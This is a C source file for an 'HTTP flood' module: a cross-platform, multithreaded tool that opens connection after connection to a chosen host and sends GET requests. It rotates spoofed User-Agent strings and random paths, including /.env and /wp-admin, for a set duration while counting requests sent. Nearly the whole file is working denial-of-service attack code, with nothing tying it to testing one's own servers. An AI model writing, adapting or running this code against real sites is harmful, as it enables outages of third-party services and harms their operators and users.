#include "http_flood.h"
#include "../config.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#ifdef _WIN32
  #define WIN32_LEAN_AND_MEAN
  #include <winsock2.h>
  #include <ws2tcpip.h>
  #include <windows.h>
  #pragma comment(lib, "ws2_32.lib")
  typedef SOCKET sock_t;
  typedef HANDLE thread_t;
  typedef CRITICAL_SECTION mutex_t;
  #define SOCK_INVALID INVALID_SOCKET
  #define CLOSESOCK closesocket
  #define MUTEX_INIT(m)   InitializeCriticalSection(&(m))
  #define MUTEX_LOCK(m)   EnterCriticalSection(&(m))
  #define MUTEX_UNLOCK(m) LeaveCriticalSection(&(m))
  #define MUTEX_DESTROY(m) DeleteCriticalSection(&(m))
#else
  #include <unistd.h>
  #include <sys/socket.h>
  #include <netinet/in.h>
  #include <arpa/inet.h>
  #include <netdb.h>
  #include <pthread.h>
  #include <errno.h>
  typedef int sock_t;
  typedef pthread_t thread_t;
  typedef pthread_mutex_t mutex_t;
  #define SOCK_INVALID (-1)
  #define CLOSESOCK close
  #define MUTEX_INIT(m)   pthread_mutex_init(&(m), NULL)
  #define MUTEX_LOCK(m)   pthread_mutex_lock(&(m))
  #define MUTEX_UNLOCK(m) pthread_mutex_unlock(&(m))
  #define MUTEX_DESTROY(m) pthread_mutex_destroy(&(m))
#endif

static const char *USER_AGENTS[] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36",
    "curl/8.4.0",
    "Wget/1.21.4",
    "Python-urllib/3.12",
    "Go-http-client/2.0"
};
#define NUM_USER_AGENTS (sizeof(USER_AGENTS) / sizeof(USER_AGENTS[0]))

static const char *RANDOM_PATHS[] = {
    "/", "/index.html", "/home", "/api/v1/data", "/search?q=test",
    "/login", "/dashboard", "/about", "/contact", "/products",
    "/api/users", "/static/main.js", "/feed.xml", "/robots.txt",
    "/wp-admin", "/.env", "/api/v2/health", "/graphql", "/status",
    "/assets/style.css"
};
#define NUM_PATHS (sizeof(RANDOM_PATHS) / sizeof(RANDOM_PATHS[0]))

struct http_flood_ctx {
    char            target[256];
    int             port;
    int             duration;
    int             num_threads;
    volatile int    stop_flag;
    int64_t         requests_sent;
    int64_t         failed_requests;
    mutex_t         stats_mutex;
    http_flood_log_fn log_cb;
    thread_t       *threads;
    double          start_time;
    double          end_time;
};

static double get_time_sec(void) {
#ifdef _WIN32
    LARGE_INTEGER freq, cnt;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&cnt);
    return (double)cnt.QuadPart / (double)freq.QuadPart;
#else
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return ts.tv_sec + ts.tv_nsec / 1e9;
#endif
}

static void log_msg(http_flood_t *ctx, const char *msg) {
    if (ctx->log_cb) ctx->log_cb(msg);
}

static void resolve_target(const char *host, int port, struct sockaddr_in *addr) {
    memset(addr, 0, sizeof(*addr));
    addr->sin_family = AF_INET;
    addr->sin_port = htons((unsigned short)port);

    struct addrinfo hints, *res;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    if (getaddrinfo(host, NULL, &hints, &res) == 0 && res) {
        struct sockaddr_in *r = (struct sockaddr_in *)res->ai_addr;
        addr->sin_addr = r->sin_addr;
        freeaddrinfo(res);
    }
}

typedef struct {
    http_flood_t *ctx;
    int           thread_id;
} worker_arg_t;

static
#ifdef _WIN32
DWORD WINAPI
#else
void *
#endif
http_flood_worker(void *arg) {
    worker_arg_t *wa = (worker_arg_t *)arg;
    http_flood_t *ctx = wa->ctx;
    int tid = wa->thread_id;
    free(wa);

    unsigned int seed = (unsigned int)(time(NULL) ^ (tid * 7919));
    struct sockaddr_in addr;
    resolve_target(ctx->target, ctx->port, &addr);

    char buf[2048];
    double deadline = ctx->start_time + ctx->duration;

    while (!ctx->stop_flag && get_time_sec() < deadline) {
        sock_t s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (s == SOCK_INVALID) {
            MUTEX_LOCK(ctx->stats_mutex);
            ctx->failed_requests++;
            MUTEX_UNLOCK(ctx->stats_mutex);
            continue;
        }

        /* Set a short connect timeout */
#ifdef _WIN32
        DWORD timeout_ms = 3000;
        setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, (const char *)&timeout_ms, sizeof(timeout_ms));
        setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (const char *)&timeout_ms, sizeof(timeout_ms));
#else
        struct timeval tv;
        tv.tv_sec = 3;
        tv.tv_usec = 0;
        setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
        setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
#endif

        if (connect(s, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
            CLOSESOCK(s);
            MUTEX_LOCK(ctx->stats_mutex);
            ctx->failed_requests++;
            MUTEX_UNLOCK(ctx->stats_mutex);
            continue;
        }

        const char *path = RANDOM_PATHS[seed % NUM_PATHS];
        const char *ua   = USER_AGENTS[seed % NUM_USER_AGENTS];
        seed = seed * 1103515245 + 12345;

        int len = snprintf(buf, sizeof(buf),
            "GET %s HTTP/1.1\r\n"
            "Host: %s\r\n"
            "User-Agent: %s\r\n"
            "Accept: */*\r\n"
            "Connection: close\r\n"
            "\r\n",
            path, ctx->target, ua);

        int sent = send(s, buf, len, 0);
        CLOSESOCK(s);

        MUTEX_LOCK(ctx->stats_mutex);
        if (sent > 0) {
            ctx->requests_sent++;
        } else {
            ctx->failed_requests++;
        }
        MUTEX_UNLOCK(ctx->stats_mutex);
    }

#ifdef _WIN32
    return 0;
#else
    return NULL;
#endif
}

int http_flood_init(http_flood_t **out, const char *target, int duration,
                    int threads, int port, http_flood_log_fn log_cb) {
    if (!out || !target) return -1;

#ifdef _WIN32
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);
#endif

    http_flood_t *ctx = (http_flood_t *)calloc(1, sizeof(http_flood_t));
    if (!ctx) return -1;

    strncpy(ctx->target, target, sizeof(ctx->target) - 1);
    ctx->port        = port > 0 ? port : DEFAULT_PORT;
    ctx->duration    = duration > 0 ? (duration > MAX_DURATION_SECONDS ? MAX_DURATION_SECONDS : duration) : DEFAULT_DURATION;
    ctx->num_threads = threads > 0 ? (threads > MAX_THREADS ? MAX_THREADS : threads) : DEFAULT_THREADS;
    ctx->stop_flag   = 0;
    ctx->requests_sent   = 0;
    ctx->failed_requests = 0;
    ctx->log_cb      = log_cb;
    ctx->threads     = (thread_t *)calloc((size_t)ctx->num_threads, sizeof(thread_t));

    MUTEX_INIT(ctx->stats_mutex);

    *out = ctx;
    return 0;
}

http_flood_stats_t http_flood_run(http_flood_t *ctx) {
    http_flood_stats_t stats;
    memset(&stats, 0, sizeof(stats));
    if (!ctx) return stats;

    char msg[256];
    snprintf(msg, sizeof(msg), "[HTTP Flood] Starting %d threads for %ds against %s:%d",
             ctx->num_threads, ctx->duration, ctx->target, ctx->port);
    log_msg(ctx, msg);

    ctx->start_time = get_time_sec();

    /* Launch workers */
    for (int i = 0; i < ctx->num_threads; i++) {
        worker_arg_t *wa = (worker_arg_t *)malloc(sizeof(worker_arg_t));
        wa->ctx = ctx;
        wa->thread_id = i;

#ifdef _WIN32
        ctx->threads[i] = CreateThread(NULL, 0, http_flood_worker, wa, 0, NULL);
#else
        pthread_create(&ctx->threads[i], NULL, http_flood_worker, wa);
#endif
    }

    /* Wait for all threads */
    for (int i = 0; i < ctx->num_threads; i++) {
#ifdef _WIN32
        WaitForSingleObject(ctx->threads[i], INFINITE);
        CloseHandle(ctx->threads[i]);
#else
        pthread_join(ctx->threads[i], NULL);
#endif
    }

    ctx->end_time = get_time_sec();

    stats.requests_sent   = ctx->requests_sent;
    stats.failed_requests = ctx->failed_requests;
    stats.start_time      = ctx->start_time;
    stats.end_time        = ctx->end_time;

    snprintf(msg, sizeof(msg), "[HTTP Flood] Finished: %lld sent, %lld failed",
             (long long)stats.requests_sent, (long long)stats.failed_requests);
    log_msg(ctx, msg);

    return stats;
}

void http_flood_stop(http_flood_t *ctx) {
    if (ctx) ctx->stop_flag = 1;
}

void http_flood_destroy(http_flood_t *ctx) {
    if (!ctx) return;
    MUTEX_DESTROY(ctx->stats_mutex);
    free(ctx->threads);
    free(ctx);

#ifdef _WIN32
    WSACleanup();
#endif
}
